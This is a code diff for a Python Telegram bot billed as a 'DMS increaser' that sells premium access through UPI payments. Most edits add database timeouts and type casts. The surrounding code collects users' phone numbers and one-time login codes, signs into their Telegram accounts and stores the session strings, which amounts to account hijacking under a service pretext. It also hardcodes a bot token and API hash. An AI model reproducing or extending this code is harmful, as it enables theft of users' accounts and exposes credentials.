@@ -18,14 +18,14 @@ def home():
 # ================== CONFIGURATION ==================
 TOKEN = '8644302388:AAGRKZzOsnXUdVF4AnaWHQRI1OHQCDpSLj0'
 URL = f'https://api.telegram.org/bot{TOKEN}/'
-ADMIN_ID = 6752542323  # Aapki personal account ID
+ADMIN_ID = 6752542323  
 
 API_ID = 2040
 API_HASH = 'b18441a1ff607e10a989891a5462e627'
 # ===================================================
 
 def init_db():
-    conn = sqlite3.connect('bot_data.db')
+    conn = sqlite3.connect('bot_data.db', timeout=10)
     cursor = conn.cursor()
     cursor.execute('''CREATE TABLE IF NOT EXISTS users (chat_id INTEGER PRIMARY KEY, is_premium INTEGER DEFAULT 0, expiry INTEGER DEFAULT 0)''')
     cursor.execute('''CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)''')
@@ -37,17 +37,17 @@ def init_db():
         'upi_id': 'sapna513@ptaxis',
         'price_1d': '10', 'price_3d': '25', 'price_7d': '50', 'price_1m': '150', 'price_perm': '299'
     }
+    conn = sqlite3.connect('bot_data.db', timeout=10)
+    cursor = conn.cursor()
     for key, value in default_settings.items():
-        conn = sqlite3.connect('bot_data.db')
-        cursor = conn.cursor()
         cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)", (key, value))
-        conn.commit()
-        conn.close()
+    conn.commit()
+    conn.close()
 
 init_db()
 
 def get_setting(key):
-    conn = sqlite3.connect('bot_data.db')
+    conn = sqlite3.connect('bot_data.db', timeout=10)
     cursor = conn.cursor()
     cursor.execute("SELECT value FROM settings WHERE key=?", (key,))
     res = cursor.fetchone()
@@ -55,28 +55,31 @@ def get_setting(key):
     return res[0] if res else "Not Set"
 
 def set_setting(key, value):
-    conn = sqlite3.connect('bot_data.db')
+    conn = sqlite3.connect('bot_data.db', timeout=10)
     cursor = conn.cursor()
     cursor.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, value))
     conn.commit()
     conn.close()
 
 def check_premium(chat_id):
-    if chat_id == ADMIN_ID: return True
-    conn = sqlite3.connect('bot_data.db')
+    if int(chat_id) == int(ADMIN_ID): 
+        return True
+    conn = sqlite3.connect('bot_data.db', timeout=10)
     cursor = conn.cursor()
-    cursor.execute("SELECT is_premium, expiry FROM users WHERE chat_id=?", (chat_id,))
+    cursor.execute("SELECT is_premium, expiry FROM users WHERE chat_id=?", (int(chat_id),))
     res = cursor.fetchone()
     conn.close()
-    if res and res[0] == 1 and res[1] > int(time.time()):
-        return True
+    if res:
+        is_prem, expiry = res
+        if int(is_prem) == 1 and int(expiry) > int(time.time()):
+            return True
     return False
 
 def make_premium(chat_id, days):
-    expiry = int(time.time()) + (days * 86400) if days < 999 else int(time.time()) + (9999 * 86400)
-    conn = sqlite3.connect('bot_data.db')
+    expiry = int(time.time()) + (int(days) * 86400) if int(days) < 999 else int(time.time()) + (9999 * 86400)
+    conn = sqlite3.connect('bot_data.db', timeout=10)
     cursor = conn.cursor()
-    cursor.execute("INSERT OR REPLACE INTO users (chat_id, is_premium, expiry) VALUES (?, 1, ?)", (chat_id, expiry))
+    cursor.execute("INSERT OR REPLACE INTO users (chat_id, is_premium, expiry) VALUES (?, 1, ?)", (int(chat_id), expiry))
     conn.commit()
     conn.close()
 
@@ -134,7 +137,7 @@ async def verify_telethon_otp(chat_id, otp):
         await client.sign_in(data['phone'], code=otp, phone_code_hash=data['phone_code_hash'])
         from telethon.sessions import StringSession
         string_session = StringSession.save(client.session)
-        conn = sqlite3.connect('bot_data.db')
+        conn = sqlite3.connect('bot_data.db', timeout=10)
         cursor = conn.cursor()
         cursor.execute("INSERT INTO sessions (chat_id, phone, session_str) VALUES (?, ?, ?)", (chat_id, data['phone'], str(string_session)))
         conn.commit()
@@ -162,16 +165,18 @@ def process_update(update):
                     send_tg_msg(chat_id, "✨ *KUNWAR DMS INCREASER* ✨\n\nChoose an option below.", get_main_menu())
                     return
 
-                if text == "/admin" and chat_id == ADMIN_ID:
+                if text == "/admin" and int(chat_id) == int(ADMIN_ID):
                     send_tg_msg(chat_id, f"⚙️ *Admin Panel*\n\n/approve [User_ID] [Days]\n/setupupi [ID]")
                     return
-                elif text.startswith("/approve ") and chat_id == ADMIN_ID:
+                elif text.startswith("/approve ") and int(chat_id) == int(ADMIN_ID):
                     parts = text.split(" ")
-                    make_premium(int(parts[1]), int(parts[2]))
-                    send_tg_msg(ADMIN_ID, f"✅ Approved ID `{parts[1]}`")
-                    send_tg_msg(int(parts[1]), f"🎉 **Premium Activated!** Admin approved your account.")
+                    target_user = parts[1].strip()
+                    target_days = parts[2].strip()
+                    make_premium(target_user, target_days)
+                    send_tg_msg(ADMIN_ID, f"✅ Approved ID `{target_user}`")
+                    send_tg_msg(int(target_user), f"🎉 **Premium Activated!** Admin approved your account.")
                     return
-                elif text.startswith("/setupupi ") and chat_id == ADMIN_ID:
+                elif text.startswith("/setupupi ") and int(chat_id) == int(ADMIN_ID):
                     set_setting('upi_id', text.split(" ", 1)[1])
                     send_tg_msg(chat_id, f"✅ UPI updated.")
                     return
@@ -190,7 +195,6 @@ def process_update(update):
                         send_tg_msg(chat_id, "⏳ **UTR Saved!** Now please send/upload the **Payment Screenshot** here:")
                         return
 
-            # PHOTO SUBMISSION & ROUTING TO ADMIN ID
             if "photo" in msg and chat_id in user_states and user_states[chat_id] == 'expecting_screenshot':
                 photo_file_id = msg["photo"][-1]["file_id"]
                 plan_data = payment_tracking.get(chat_id, {})
@@ -198,11 +202,8 @@ def process_update(update):
                 utr_number = plan_data.get('utr', 'NOT_PROVIDED')
                 
                 user_states.pop(chat_id, None)
-                
-                # Instant user notification
                 send_tg_msg(chat_id, "✅ Your details successful verified wait for admin approval")
                 
-                # Dynamic admin request broadcast
                 admin_caption = f"🔔 **NEW PREMIUM APPROVAL REQUEST**\n\n👤 **User ID:** `{chat_id}`\n📦 **Plan:** {plan_name.upper()}\n🔢 **UTR:** `{utr_number}`\n\n⚠️ *Copy-paste command to approve:*\n`/approve {chat_id} 30`"
                 requests.post(URL + 'sendPhoto', json={'chat_id': ADMIN_ID, 'photo': photo_file_id, 'caption': admin_caption, 'parse_mode': 'Markdown'})
                 return
@@ -231,7 +232,8 @@ def process_update(update):
                     return
                 send_tg_msg(chat_id, "📱 Enter phone number with country code:")
                 user_states[chat_id] = 'expecting_phone'
-    except: pass
+    except Exception as e:
+        pass
 
 def run_bot_loop():
     requests.get(URL + 'deleteWebhook')
